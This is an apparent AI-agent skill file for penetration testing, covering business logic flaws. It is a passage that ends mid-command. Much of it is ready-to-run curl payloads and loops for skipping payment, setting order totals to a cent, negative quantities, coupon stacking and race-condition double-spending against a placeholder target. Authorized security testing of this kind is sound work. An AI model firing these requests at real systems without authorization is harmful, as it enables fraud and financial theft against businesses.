---
name: scan-fase-16
description: Execute FASE 16 - Business Logic Testing. Deep exploration of application-specific vulnerabilities including workflow manipulation, state bypasses, limit circumvention, race conditions, and price/amount tampering. Uses reverse engineering, threat modeling (STRIDE), and behavioral analysis to discover business logic flaws invisible to automated scanners. Adapts dynamically to each application's unique workflows and business rules. Works with ANY backend - Supabase, Firebase, Django, FastAPI, Node.js, Rails, Spring, .NET, PHP, Go, or custom. Invoke with /scan-fase-16 {url}.
---

# FASE 16: Business Logic Testing - Deep Vulnerability Exploration

Comprehensive business logic security testing that goes beyond the checklist. This phase uses advanced techniques from reverse engineering, threat modeling, and behavioral analysis to discover application-specific vulnerabilities that automated tools cannot detect.

**Why Business Logic Testing is Different:**
- Automated scanners find TECHNICAL vulnerabilities (SQLi, XSS, misconfigurations)
- Business logic flaws are CONTEXTUAL - they depend on understanding what the application SHOULD do
- Every application has UNIQUE business rules that can be bypassed
- These vulnerabilities often have the HIGHEST impact (financial fraud, data manipulation)

**Universal Compatibility**: This skill works with ANY technology stack:
- **BaaS**: Supabase, Firebase, AWS Amplify, Appwrite
- **Python**: Django, FastAPI, Flask, Tornado
- **JavaScript/TypeScript**: Node.js, Express, NestJS, Next.js, Nuxt
- **Ruby**: Rails, Sinatra
- **Java/Kotlin**: Spring Boot, Quarkus, Micronaut
- **Go**: Gin, Echo, Fiber
- **PHP**: Laravel, Symfony, WordPress
- **.NET**: ASP.NET Core, Blazor
- **Custom/Unknown**: Adapts to any backend detected

---

## Prerequisites

- FASE 0 completed (backend detection - identifies stack type)
- FASE 1 completed (reconnaissance - extracts configs, keys, endpoints)
- FASE 2 recommended (schema discovery - understands data models)
- FASE 12 recommended (JS bundle analysis - discovers hidden endpoints)
- FASE 14 recommended (authenticated testing - understands user flows)
- Target URL accessible
- Previous phase findings documented in `clients/{name}/SCAN-IN-PROGRESS.md`
- Understanding of what the application DOES (business purpose)

---

## CRITICAL: Adaptive Exploration Mindset

**This skill provides STARTING POINTS, not limitations. Every application's business logic is UNIQUE.**

### Core Principles

1. **Understand the business first** - Before testing, understand what the app is supposed to DO
2. **Think like a fraudster** - How would someone abuse this for financial gain?
3. **Question every assumption** - "This should be server-side validated" - but IS it?
4. **Combine techniques** - State manipulation + race conditions often work together
5. **Every app has unique workflows** - Generic tests miss app-specific logic
6. **Document EVERYTHING** - Failed tests reveal how the app validates

### Reverse Engineering Approach

Apply reverse engineering methodology to understand application behavior:

```yaml
reverse_engineering_steps:
  1_reconnaissance:
    - Map all user-facing workflows
    - Identify state transitions
    - Document API calls for each action
    - Note timing and sequence requirements

  2_static_analysis:
    - Analyze JS bundles for validation logic
    - Search for hardcoded limits and thresholds
    - Identify client-side checks (bypass candidates)
    - Map state machine patterns

  3_dynamic_analysis:
    - Observe normal request/response patterns
    - Modify requests at each step
    - Track state changes across sessions
    - Monitor for race condition windows

  4_hypothesis_testing:
    - Form hypothesis: "Limit X is validated only client-side"
    - Test hypothesis: Bypass client, send modified request
    - Document result: Confirmed/Refuted
    - Iterate with new hypothesis
```

### Threat Modeling Approach (STRIDE for Business Logic)

Apply STRIDE specifically to business workflows:

```yaml
stride_business_logic:
  spoofing:
    - "Can I act as another user in this workflow?"
    - "Can I spoof transaction source/origin?"
    - "Can I impersonate admin in business process?"

  tampering:
    - "Can I modify prices/amounts in transit?"
    - "Can I change order status directly?"
    - "Can I alter workflow state without authorization?"

  repudiation:
    - "Can I perform actions without audit trail?"
    - "Can I delete evidence of my transactions?"
    - "Can I replay transactions for double spending?"

  information_disclosure:
    - "Does workflow expose other users' data?"
    - "Do error messages reveal business rules?"
    - "Can I enumerate valid coupon codes?"

  denial_of_service:
    - "Can I exhaust limited resources (coupons, slots)?"
    - "Can I lock other users out of workflows?"
    - "Can I cause cascade failures?"

  elevation_of_privilege:
    - "Can I skip payment step?"
    - "Can I access premium features without paying?"
    - "Can I escalate from trial to full access?"
```

### Behavioral Analysis Approach

Observe and analyze application behavior patterns:

```yaml
behavioral_analysis:
  timing_analysis:
    - Measure response times for different inputs
    - Identify operations that take longer (validation)
    - Find race condition windows

  error_analysis:
    - Collect all unique error messages
    - Map errors to validation rules
    - Find validation gaps between errors

  state_analysis:
    - Track all possible states for entities
    - Identify illegal state transitions
    - Find states that bypass validation

  boundary_analysis:
    - Test at exact boundaries (limit = 10, test 9, 10, 11)
    - Test type boundaries (INT_MAX, negative, decimal)
    - Test time boundaries (exact expiry moment)
```

### When You Find Something NOT in the Checklist

**ALWAYS document unexpected findings:**

```yaml
unexpected_finding:
  type: "{finding_type}"
  workflow: "{affected_workflow}"
  description: "Detailed description of what was found"

  discovery_method:
    technique: "{reverse_engineering|threat_modeling|behavioral|fuzzing}"
    observation: "What led to this discovery"

  exploitation:
    preconditions:
      - "User must be logged in"
      - "Must have at least one item in cart"
    steps:
      - "Step 1: Navigate to checkout"
      - "Step 2: Intercept request"
      - "Step 3: Modify price field"
    result: "Order placed with $0.01 total instead of $500"

  business_impact:
    financial: "Unlimited free products"
    legal: "Fraud liability"
    reputation: "Loss of customer trust"

  severity: "CRITICAL"
  cvss: "9.1 (AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H)"

  poc: |
    curl -X POST "https://target.com/api/checkout" \
      -H "Authorization: Bearer {token}" \
      -d '{"cart_id": "abc", "total": 0.01}'

  added_to_report: true
```

---

## Phase Overview

### Core Checklist (16.1-16.5)
| Phase | Test | Technique | Priority |
|-------|------|-----------|----------|
| 16.1 | Workflow Analysis | Reverse Engineering | SETUP |
| 16.2 | State Manipulation | State Machine Analysis | CRITICAL |
| 16.3 | Limit Bypass | Boundary Analysis | CRITICAL |
| 16.4 | Race Conditions | Timing Analysis | CRITICAL |
| 16.5 | Price/Amount Manipulation | Integrity Testing | CRITICAL |

### Extended Business Logic (16.6-16.13) - Deep Exploration (5 Most Critical)
| Phase | Test | Technique | Priority |
|-------|------|-----------|----------|
| 16.6 | Workflow Skip/Bypass | State Machine Exploitation | CRITICAL |
| 16.7 | Coupon/Discount Abuse | Business Rule Fuzzing | HIGH |
| 16.9 | Subscription/Trial Abuse | Time-Based Bypass | HIGH |
| 16.11 | Multi-Step Transaction Tampering | Session Integrity | CRITICAL |
| 16.13 | Integer Overflow/Underflow | Numeric Boundary | CRITICAL |

---

## Phase 16.1: Workflow Analysis (Reconnaissance)

### Objective
Map all critical business workflows to understand the application's state machine and identify potential bypass points. This is ESSENTIAL before any testing.

### Methodology

**Think like a reverse engineer:**
1. Observe normal operation
2. Document state transitions
3. Identify validation points
4. Find potential bypass candidates

### Execution

```bash
# === Step 1: Identify application purpose ===
echo "=== What does this application DO? ==="
# Examples:
# - E-commerce: Browse → Add to Cart → Checkout → Payment → Order
# - SaaS: Signup → Trial → Subscribe → Use Features
# - Booking: Search → Select → Reserve → Pay → Confirm
# - Social: Register → Create Content → Engage → Monetize

# === Step 2: Map workflows by observing network traffic ===
# Use browser DevTools Network tab or Playwright to record all API calls during:
# 1. User registration
# 2. Core business action (purchase, booking, submission)
# 3. Payment flow (if exists)
# 4. Status changes
```

### Playwright Workflow Mapping

```javascript
// Record all API calls during a workflow
const apiCalls = [];

page.on('request', request => {
  if (request.url().includes('/api/') || request.url().includes('/rest/')) {
    apiCalls.push({
      method: request.method(),
      url: request.url(),
      postData: request.postData(),
      timestamp: Date.now()
    });
  }
});

// Execute the workflow
await page.goto('https://target.com/products');
await page.click('[data-testid="add-to-cart"]');
await page.goto('/cart');
await page.click('[data-testid="checkout"]');
// ... continue workflow

// Analyze collected calls
console.log('Workflow API Calls:', JSON.stringify(apiCalls, null, 2));
```

### Workflow Documentation Template

```yaml
workflow_analysis:
  application_type: "{e-commerce|saas|booking|social|fintech|other}"
  core_business_value: "What users pay for / main action"

  critical_workflows:
    - name: "Checkout Flow"
      states:
        - "cart_empty"
        - "items_added"
        - "checkout_started"
        - "payment_pending"
        - "payment_completed"
        - "order_confirmed"

      transitions:
        - from: "cart_empty"
          to: "items_added"
          trigger: "POST /api/cart/add"
          validation: "Product exists, stock available"

        - from: "items_added"
          to: "checkout_started"
          trigger: "POST /api/checkout/init"
          validation: "Cart not empty, user logged in"

        - from: "checkout_started"
          to: "payment_completed"
          trigger: "POST /api/payment/process"
          validation: "Amount matches cart, payment succeeds"

      bypass_candidates:
        - "Can I go from cart_empty to order_confirmed directly?"
        - "Can I modify amount between checkout_started and payment?"
        - "Can I skip payment_pending and go to order_confirmed?"

    - name: "User Registration"
      states: ["guest", "registered_unverified", "registered_verified", "premium"]
      bypass_candidates:
        - "Can I skip email verification?"
        - "Can I self-upgrade to premium?"
```

### Adaptive: E-Commerce Specific Analysis

```yaml
ecommerce_workflow_analysis:
  product_catalog:
    api_endpoints:
      - "GET /api/products"
      - "GET /api/products/{id}"
    potential_issues:
      - "Price manipulation via hidden parameters"
      - "Access to unpublished products"
      - "Stock count manipulation"

  shopping_cart:
    api_endpoints:
      - "POST /api/cart/add"
      - "PATCH /api/cart/{item_id}"
      - "DELETE /api/cart/{item_id}"
    potential_issues:
      - "Negative quantity"
      - "Price modification"
      - "Cart ID enumeration (access others' carts)"

  checkout:
    api_endpoints:
      - "POST /api/checkout"
      - "POST /api/payment/process"
    potential_issues:
      - "Total amount mismatch"
      - "Shipping cost bypass"
      - "Tax calculation manipulation"

  order_management:
    api_endpoints:
      - "GET /api/orders"
      - "PATCH /api/orders/{id}/status"
    potential_issues:
      - "Order status manipulation"
      - "Refund without return"
      - "Cancel after fulfillment"
```

### Adaptive: SaaS Specific Analysis

```yaml
saas_workflow_analysis:
  subscription:
    states: ["trial", "basic", "premium", "enterprise", "cancelled"]
    api_endpoints:
      - "POST /api/subscription/upgrade"
      - "POST /api/subscription/downgrade"
      - "DELETE /api/subscription"
    potential_issues:
      - "Trial extension"
      - "Plan feature bypass"
      - "Cancellation with refund abuse"

  feature_access:
    api_endpoints:
      - "GET /api/features"
      - "POST /api/features/{feature}/use"
    potential_issues:
      - "Premium feature access on free tier"
      - "Usage limit bypass"
      - "Feature flag manipulation"

  team_management:
    api_endpoints:
      - "POST /api/team/invite"
      - "PATCH /api/team/member/{id}/role"
    potential_issues:
      - "Self role elevation"
      - "Invite limit bypass"
      - "Access after removal"
```

### Output

```yaml
phase_16_1:
  status: completed

  application_profile:
    type: "{app_type}"
    industry: "{industry}"
    monetization: "{subscription|transaction|freemium|ads}"
    critical_value: "{what users pay for}"

  workflows_identified: {count}
  workflows:
    - name: "{workflow_name}"
      criticality: "{critical|high|medium}"
      states_count: {number}
      transitions_count: {number}
      validation_points: {number}
      bypass_candidates: {number}

  api_endpoints_mapped: {count}

  high_value_targets:
    - endpoint: "{endpoint}"
      reason: "Handles payment processing"
      priority: "CRITICAL"

  next_phases:
    - "16.2: Test state manipulation on {workflow}"
    - "16.4: Test race conditions on {endpoint}"
```

---

## Phase 16.2: State Manipulation

### Objective
Exploit state machine vulnerabilities to bypass required steps, revert to previous states, or achieve illegal states.

### Attack Categories

| Attack Type | Description | Example |
|-------------|-------------|---------|
| Step Skipping | Bypass mandatory workflow steps | Skip payment, go to confirmed |
| State Reversal | Go back to previous states illegally | Unpay an order, re-use discount |
| Illegal State | Achieve states that shouldn't exist | Order with negative total |
| State Confusion | Multiple concurrent states | Logged in AND anonymous |

### Execution

```bash
TARGET_URL="https://target.com"
ACCESS_TOKEN="..."

# === Test 16.2.1: Skip mandatory steps ===
echo "=== Testing: Skip checkout, create order directly ==="

# Attempt to create order without going through checkout
curl -X POST "$TARGET_URL/api/orders" \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "items": [{"product_id": "prod_123", "quantity": 1}],
    "status": "confirmed",
    "payment_status": "completed"
  }'

# === Test 16.2.2: Retrograde state transition ===
echo "=== Testing: Revert completed order to pending ==="

# First, get a completed order
ORDER_ID="order_abc123"

# Attempt to change status back
curl -X PATCH "$TARGET_URL/api/orders/$ORDER_ID" \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"status": "pending", "payment_status": "pending"}'

# === Test 16.2.3: Illegal state via direct field manipulation ===
echo "=== Testing: Set order total to 0 ==="

curl -X PATCH "$TARGET_URL/api/orders/$ORDER_ID" \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"total": 0, "status": "confirmed"}'

# === Test 16.2.4: Bypass email verification ===
echo "=== Testing: Access protected features without verification ==="

curl -X GET "$TARGET_URL/api/dashboard" \
  -H "Authorization: Bearer $ACCESS_TOKEN"
# Check if verification status is validated server-side
```

### Supabase-Specific State Manipulation

```bash
SUPABASE_URL="https://xxx.supabase.co"
ANON_KEY="..."
ACCESS_TOKEN="..."

# === Direct table manipulation (if RLS allows) ===
echo "=== Testing: Direct state manipulation via REST API ==="

# Attempt to update order status directly
curl -X PATCH "$SUPABASE_URL/rest/v1/orders?id=eq.{order_id}" \
  -H "apikey: $ANON_KEY" \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"status": "shipped", "payment_status": "refunded"}'

# === Check if RLS allows status updates ===
# Policy might allow UPDATE but not check valid status transitions
```

### GraphQL State Manipulation

```bash
# === GraphQL mutation to bypass state ===
curl -X POST "$TARGET_URL/graphql" \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "query": "mutation { updateOrder(id: \"order_123\", input: { status: \"shipped\", paidAt: \"2024-01-01\" }) { id status } }"
  }'

# === Batch mutations to achieve illegal state ===
curl -X POST "$TARGET_URL/graphql" \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "query": "mutation { a: updateOrder(id: \"123\", input: {status: \"cancelled\"}) { id } b: updateOrder(id: \"123\", input: {refundStatus: \"completed\"}) { id } }"
  }'
```

### Output

```yaml
phase_16_2:
  status: completed

  state_manipulation_tests:
    total_tests: {number}
    vulnerabilities_found: {number}

  findings:
    - test: "16.2.1 - Skip checkout step"
      workflow: "Order Creation"
      attack: "Direct POST to /api/orders with status=confirmed"
      result: "VULNERABLE"
      response_code: 201
      business_impact: "Orders can be created without payment"
      severity: "CRITICAL"
      poc: |
        curl -X POST "https://target.com/api/orders" \
          -H "Authorization: Bearer {token}" \
          -d '{"items": [...], "status": "confirmed"}'

    - test: "16.2.2 - Retrograde order status"
      workflow: "Order Management"
      attack: "PATCH order status from 'completed' to 'pending'"
      result: "BLOCKED"
      response_code: 400
      message: "Invalid status transition"
      note: "Server validates state machine"

  secure_patterns_observed:
    - "Status transitions validated server-side"
    - "Payment verification on order creation"

  severity: "{highest severity}"
```

---

## Phase 16.3: Limit Bypass

### Objective
Circumvent quantity limits, value caps, time restrictions, and other business-enforced boundaries.

### Limit Categories

| Limit Type | Examples | Bypass Technique |
|------------|----------|------------------|
| Quantity | Max 10 items, 1 coupon per user | Negative numbers, large values, fractional |
| Value | Min order $10, max transfer $1000 | Boundary values, type confusion |
| Time | Coupon expires, limited offer | Timezone manipulation, cached tokens |
| Frequency | 3 downloads/day, 5 API calls/minute | Concurrent requests, session manipulation |
| Access | Free tier 100 records | Parameter manipulation, pagination abuse |

### Execution

```bash
TARGET_URL="https://target.com"
ACCESS_TOKEN="..."

# === Test 16.3.1: Quantity limit bypass ===
echo "=== Testing: Exceed item quantity limits ==="

# Assume limit is 10 items per cart
# Test boundary
curl -X POST "$TARGET_URL/api/cart/add" \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -d '{"product_id": "prod_123", "quantity": 10}'

curl -X POST "$TARGET_URL/api/cart/add" \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -d '{"product_id": "prod_123", "quantity": 11}'

# Test extreme values
curl -X POST "$TARGET_URL/api/cart/add" \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -d '{"product_id": "prod_123", "quantity": 999999}'

curl -X POST "$TARGET_URL/api/cart/add" \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -d '{"product_id": "prod_123", "quantity": -1}'

# Test decimal (should items be whole numbers?)
curl -X POST "$TARGET_URL/api/cart/add" \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -d '{"product_id": "prod_123", "quantity": 0.5}'

# === Test 16.3.2: Discount/value limits ===
echo "=== Testing: Exceed discount limits ==="

# Apply coupon with modified value
curl -X POST "$TARGET_URL/api/cart/coupon" \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -d '{"code": "SAVE10", "discount_percent": 100}'

# Multiple coupons
curl -X POST "$TARGET_URL/api/cart/coupon" \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -d '{"codes": ["SAVE10", "SAVE20", "SAVE50"]}'

# === Test 16.3.3: Time-based limit bypass ===
echo "=== Testing: Use expired resources ==="

# Attempt to use expired coupon
curl -X POST "$TARGET_URL/api/cart/coupon" \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -d '{"code": "EXPIRED2023"}'

# Check if expiry is validated server-side
curl -X POST "$TARGET_URL/api/cart/coupon" \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -d '{"code": "SAVE10", "applied_at": "2020-01-01T00:00:00Z"}'
```

### Boundary Testing Patterns

```bash
# === Integer boundaries ===
VALUES=(
  "0"
  "1"
  "-1"
  "2147483647"      # INT32_MAX
  "2147483648"      # INT32_MAX + 1
  "-2147483648"     # INT32_MIN
  "9999999999999"   # Large number
  "0.001"           # Small decimal
  "1e10"            # Scientific notation
  "NaN"             # Not a number
  "Infinity"        # Infinity
  "null"            # Null
  '""'              # Empty string
)

for VALUE in "${VALUES[@]}"; do
  echo "Testing quantity: $VALUE"
  RESPONSE=$(curl -s -X POST "$TARGET_URL/api/cart/add" \
    -H "Authorization: Bearer $ACCESS_TOKEN" \
    -H "Content-Type: application/json" \
    -d "{\"product_id\": \"prod_123\", \"quantity\": $VALUE}")
  echo "Response: $RESPONSE"
  echo "---"
done
```

### Free Tier Limit Bypass

```bash
# === Test API rate/quota limits ===
echo "=== Testing: Free tier API limits ==="

# If free tier allows 100 records
curl -X GET "$TARGET_URL/api/data?limit=101" \
  -H "Authorization: Bearer $ACCESS_TOKEN"

# Pagination abuse
for OFFSET in 0 100 200 300 400; do
  curl -X GET "$TARGET_URL/api/data?limit=100&offset=$OFFSET" \
    -H "Authorization: Bearer $ACCESS_TOKEN"
done

# Check if different endpoints share quota
curl -X GET "$TARGET_URL/api/data" -H "Authorization: Bearer $ACCESS_TOKEN"
curl -X GET "$TARGET_URL/api/export" -H "Authorization: Bearer $ACCESS_TOKEN"
```

### Output

```yaml
phase_16_3:
  status: completed

  limit_bypass_tests:
    quantity_limits:
      tested: 8
      bypassed: 2
    value_limits:
      tested: 5
      bypassed: 1
    time_limits:
      tested: 3
      bypassed: 0
    frequency_limits:
      tested: 4
      bypassed: 1

  findings:
    - test: "16.3.1 - Negative quantity"
      limit_type: "quantity"
      expected_behavior: "Reject quantity < 1"
      actual_behavior: "Accepted quantity: -5"
      impact: "Negative items reduce cart total"
      business_impact: "Free products via negative offset"
      severity: "CRITICAL"
      poc: |
        curl -X POST "$TARGET/api/cart/add" \
          -d '{"product_id": "expensive_item", "quantity": -1}'
        # Cart total: Original $100 - $500 = -$400 (credit?)

    - test: "16.3.2 - Multiple coupons"
      limit_type: "value"
      expected_behavior: "One coupon per order"
      actual_behavior: "All coupons applied"
      impact: "100% discount achieved"
      severity: "CRITICAL"

  severity: "{highest}"
```

---

## Phase 16.4: Race Conditions

### Objective
Exploit time-of-check-to-time-of-use (TOCTOU) vulnerabilities in business operations to achieve double-spending, resource exhaustion, or bypassing single-use restrictions.

### Race Condition Categories

| Category | Example | Impact |
|----------|---------|--------|
| Double Spending | Redeem coupon twice simultaneously | Financial loss |
| Inventory Racing | Book same room/seat twice | Overbooking |
| Balance Racing | Withdraw more than balance | Financial fraud |
| Limit Racing | Create more than allowed | Resource exhaustion |
| State Racing | Modify during transition | Inconsistent state |

### Execution

```bash
TARGET_URL="https://target.com"
ACCESS_TOKEN="..."

# === Test 16.4.1: Double coupon redemption ===
echo "=== Testing: Race condition on coupon redemption ==="

# Single-use coupon should only work once
# Send 10 concurrent requests
for i in {1..10}; do
  curl -s -X POST "$TARGET_URL/api/cart/coupon" \
    -H "Authorization: Bearer $ACCESS_TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"code": "SINGLETRY50"}' &
done
wait

# Check how many succeeded
echo "Check coupon usage count in response or database"

# === Test 16.4.2: Inventory racing ===
echo "=== Testing: Book limited resource simultaneously ==="

# Product with 1 item in stock
PRODUCT_ID="limited_edition_123"

for i in {1..5}; do
  curl -s -X POST "$TARGET_URL/api/orders" \
    -H "Authorization: Bearer $ACCESS_TOKEN" \
    -H "Content-Type: application/json" \
    -d "{\"items\": [{\"product_id\": \"$PRODUCT_ID\", \"quantity\": 1}]}" &
done
wait

# === Test 16.4.3: Balance/credit racing ===
echo "=== Testing: Withdraw more than balance ==="

# Account has $100, try to make 5x $50 withdrawals simultaneously
for i in {1..5}; do
  curl -s -X POST "$TARGET_URL/api/wallet/withdraw" \
    -H "Authorization: Bearer $ACCESS_TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"amount": 50}' &
done
wait
```

### Advanced Race Condition Testing

```bash
# === Using GNU Parallel for precise timing ===
echo "=== High-precision race condition test ==="

# Install if needed: apt-get install parallel

# Create request file
cat > /tmp/race_request.sh << 'EOF'
curl -s -X POST "$1/api/coupon/redeem" \
  -H "Authorization: Bearer $2" \
  -d '{"code": "ONEUSE"}'
EOF
chmod +x /tmp/race_request.sh

# Execute 20 requests with 0ms delay between them
seq 1 20 | parallel -j 20 /tmp/race_request.sh "$TARGET_URL" "$ACCESS_TOKEN"

# === Using curl with timing ===
# Send requests at exact same millisecond using background jobs
(
  sleep 0.1
  curl -s "$TARGET_URL/api/redeem" -H "Authorization: Bearer $ACCESS_TOKEN" -d '{"code": "X"}' &
  curl -s "$TARGET_URL/api/redeem" -H "Authorization: Bearer $ACCESS_TOKEN" -d '{"code": "X"}' &
  curl -s "$TARGET_URL/api/redeem" -H "Authorization: Bearer $ACCESS_TOKEN" -d '{"code": "X"}' &
  wait
)
```

### Supabase Race Condition Testing

```bash
SUPABASE_URL="https://xxx.supabase.co"
ANON_KEY="..."
ACCESS_TOKEN="..."

# === Test if RLS + triggers prevent race conditions ===
echo "=== Testing: Supabase concurrent updates ==="

# Attempt concurrent balance updates
for i in {1..10}; do
  curl -s -X POST "$SUPABASE_URL/rest/v1/rpc/decrement_balance" \
    -H "apikey: $ANON_KEY" \
    -H "Authorization: Bearer $ACCESS_TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"amount": 10}' &
done
wait

# Check if balance went negative (race condition success)
curl -s "$SUPABASE_URL/rest/v1/profiles?select=balance&id=eq.{user_id}" \
  -H "apikey: $ANON_KEY" \
  -H "Authorization: Bearer $ACCESS_TOKEN"
```

### Output

```yaml
phase_16_4:
  status: completed

  race_condition_tests:
    total_tests: {number}
    vulnerable_endpoints: {number}

  findings:
    - test: "16.4.1 - Double coupon redemption"
      endpoint: "POST /api/cart/coupon"
      concurrent_requests: 10
      expected_success: 1
      actual_success: 7
      result: "VULNERABLE"
      impact: "Single-use coupon redeemed 7 times"
      business_impact: "$350 in fraudulent discounts"
      severity: "CRITICAL"
      root_cause: "No database-level locking, check-then-use pattern"
      poc: |
        # Send 10 concurrent requests
        for i in {1..10}; do
          curl -X POST "$URL/api/cart/coupon" -d '{"code": "SINGLETRY50"}' &
        done

    - test: "16.4.2 - Inventory overselling"
      endpoint: "POST /api/orders"
      stock_before: 1
      concurrent_orders: 5
      successful_orders: 3
      result: "VULNERABLE"
      impact: "Sold 3 units when only 1 in stock"
      severity: "HIGH"

  race_condition_windows:
    - endpoint: "/api/wallet/withdraw"
      window_ms: 15
      exploitable: true
    - endpoint: "/api/orders"
      window_ms: 8
      exploitable: true

  severity: "CRITICAL"
```

---

## Phase 16.5: Price/Amount Manipulation

### Objective
Test if prices, amounts, totals, and financial values can be manipulated at any point in the transaction flow.

### Attack Vectors

| Vector | Description | Location |
|--------|-------------|----------|
| Frontend Modification | Change price in form/request before submit | Client-side |
| API Parameter Tampering | Modify price field in API request | Network |
| Currency Manipulation | Change currency code for conversion exploit | API |
| Rounding Exploitation | Exploit decimal precision differences | Calculation |
| Tax/Fee Bypass | Remove or modify tax calculations | API |

### Execution

```bash
TARGET_URL="https://target.com"
ACCESS_TOKEN="..."

# === Test 16.5.1: Direct price modification ===
echo "=== Testing: Modify product price in request ==="

# Normal add to cart
curl -X POST "$TARGET_URL/api/cart/add" \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"product_id": "prod_123", "quantity": 1}'

# Add with modified price (if API accepts price field)
curl -X POST "$TARGET_URL/api/cart/add" \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"product_id": "prod_123", "quantity": 1, "price": 0.01}'

curl -X POST "$TARGET_URL/api/cart/add" \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"product_id": "prod_123", "quantity": 1, "unit_price": 0.01}'

# === Test 16.5.2: Checkout total manipulation ===
echo "=== Testing: Modify checkout total ==="

# Get cart total
CART=$(curl -s "$TARGET_URL/api/cart" -H "Authorization: Bearer $ACCESS_TOKEN")
echo "Cart: $CART"

# Checkout with modified total
curl -X POST "$TARGET_URL/api/checkout" \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"cart_id": "cart_123", "total": 0.01}'

curl -X POST "$TARGET_URL/api/checkout" \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"cart_id": "cart_123", "subtotal": 0.01, "tax": 0, "shipping": 0}'

# === Test 16.5.3: Negative values ===
echo "=== Testing: Negative price/quantity ==="

curl -X POST "$TARGET_URL/api/cart/add" \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"product_id": "prod_123", "quantity": 1, "price": -100}'

curl -X POST "$TARGET_URL/api/checkout" \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"cart_id": "cart_123", "discount": -500}'

# === Test 16.5.4: Currency manipulation ===
echo "=== Testing: Currency code manipulation ==="

# If multi-currency supported
curl -X POST "$TARGET_URL/api/checkout" \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"cart_id": "cart_123", "currency": "IDR"}'  # Change to weak currency

# === Test 16.5.5: Overflow/precision ===
echo "=== Testing: Integer overflow in amounts ==="

curl -X POST "$TARGET_URL/api/checkout" \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"cart_id": "cart_123", "total": 9999999999999999999}'

curl -X POST "$TARGET_URL/api/checkout" \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"cart_id": "cart_123", "total": 0.001}'  # Below minimum precision
```

### Stripe Integration Testing

```bash
# === Test if Stripe amount matches server calculation ===
echo "=== Testing: Stripe payment amount verification ==="

# 1. Create checkout session
SESSION=$(curl -s -X POST "$TARGET_URL/api/create-checkout-session" \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -d '{"cart_id": "cart_123"}')

# 2. Extract Stripe session ID
SESSION_ID=$(echo "$SESSION" | jq -r '.session_id')

# 3. Check if we can access Stripe's expected amount
# (Usually not possible, but test for information disclosure)
curl -s "https://api.stripe.com/v1/checkout/sessions/$SESSION_ID" \
  -u "sk_test_xxx:" 2>/dev/null | jq '.amount_total'

# 4. After payment, verify order total matches
# This tests if server re-validates total after Stripe confirmation
```

### Output

```yaml
phase_16_5:
  status: completed

  price_manipulation_tests:
    total_tests: {number}
    vulnerable_endpoints: {number}

  findings:
    - test: "16.5.1 - Price field in cart add"
      endpoint: "POST /api/cart/add"
      attack: "Include price: 0.01 in request body"
      result: "VULNERABLE"
      original_price: "$99.99"
      manipulated_price: "$0.01"
      impact: "Products added at arbitrary price"
      severity: "CRITICAL"
      poc: |
        curl -X POST "$URL/api/cart/add" \
          -H "Authorization: Bearer $TOKEN" \
          -d '{"product_id": "premium_item", "quantity": 1, "price": 0.01}'

    - test: "16.5.2 - Checkout total modification"
      endpoint: "POST /api/checkout"
      attack: "Modify total field in checkout request"
      result: "BLOCKED"
      response: "Total mismatch, recalculated server-side"
      note: "Server recalculates total from cart items"

    - test: "16.5.3 - Negative discount"
      endpoint: "POST /api/checkout"
      attack: "discount: -500"
      result: "VULNERABLE"
      impact: "Negative discount increased total (customer pays more)"
      note: "Bug but not exploitable for fraud"
      severity: "LOW"

  secure_patterns_observed:
    - "Server recalculates totals from cart"
    - "Prices fetched from database, not request"
    - "Stripe webhook validates amount"

  severity: "CRITICAL"
```

---

## Phase 16.6: Workflow Skip/Bypass (Extended)

### Objective
Test if mandatory workflow steps can be skipped entirely by directly accessing later stages.

### Common Bypass Targets

| Workflow | Skip Target | Impact |
|----------|-------------|--------|
| E-commerce | Payment step | Free products |
| KYC/Verification | Identity check | Unverified access |
| Onboarding | Required tutorials | Missed compliance |
| Approval flows | Manager approval | Unauthorized changes |
| Multi-factor | Second factor | Auth bypass |

### Execution

```bash
TARGET_URL="https://target.com"
ACCESS_TOKEN="..."

# === Test: Skip payment, create confirmed order ===
echo "=== Testing: Create order with completed status directly ==="

# Bypass checkout flow
curl -X POST "$TARGET_URL/api/orders" \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "items": [{"product_id": "prod_123", "quantity": 1}],
